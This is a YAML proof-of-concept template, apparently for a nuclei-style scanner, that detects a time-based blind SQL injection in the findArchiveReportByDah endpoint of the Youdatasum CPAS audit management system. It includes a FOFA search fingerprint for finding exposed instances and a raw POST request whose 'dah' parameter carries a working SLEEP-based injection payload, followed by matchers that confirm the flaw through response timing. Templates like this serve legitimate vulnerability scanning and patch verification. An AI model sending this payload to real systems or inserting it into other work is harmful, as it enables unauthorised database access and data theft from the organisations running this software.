id: poc-yaml-youdatasum-cpas-findarchivereportbydah-sqli
info:
  name: 友数聚 CPAS审计管理系统 findArchiveReportByDah SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: CPAS审计管理系统
    fofa: body="/cpasm4/static/cap/font/iconfont.css"

variables:
  t1: "{{rand_int(1,4)}}"
  t2: "{{to_number(t1) * 3}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        dah=1' AND (SELECT * FROM (SELECT(SLEEP({{t1}})))x) AND '1'='1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"total" :'
          - '"rows" :'
        part: body

      - type: word
        words:
          - "application/json"
        part: header

      - type: word
        words:
          - "<"
        part: body
        negative: true

      - type: dsl
        dsl:
          - "duration > to_number(t2)"
          - "duration < to_number(t3)"
